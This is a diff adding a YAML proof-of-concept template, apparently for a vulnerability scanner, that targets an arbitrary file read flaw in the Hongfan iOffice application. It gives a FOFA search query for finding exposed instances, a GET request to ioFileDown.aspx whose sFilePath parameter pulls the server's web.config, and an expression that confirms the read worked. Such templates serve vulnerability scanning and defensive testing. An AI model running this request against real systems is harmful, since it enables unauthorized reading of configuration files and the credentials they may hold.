@@ -1,0 +1,15 @@
+id: poc-yaml-ioffice-iofiledown-read-any-file
+info:
+  name: 红帆iOffice ioFileDown任意文件读取
+  severity: high
+  tags:
+  - 文件读取
+  finger: iOffice
+  fofa: app="红帆-ioffice"
+requests:
+- method: GET
+  path: /ioffice/prg/interface/ioFileDown.aspx?sFilePath=/ioffice/web.config
+  expression: "status_code == 200 && \ncontains(body,\"<configuration>\") &&\ncontains(body,\"\
+    <configSections>\") &&\ncontains(headers, \"application/octet-stream\")\n"
+variables: {}
+transport: http
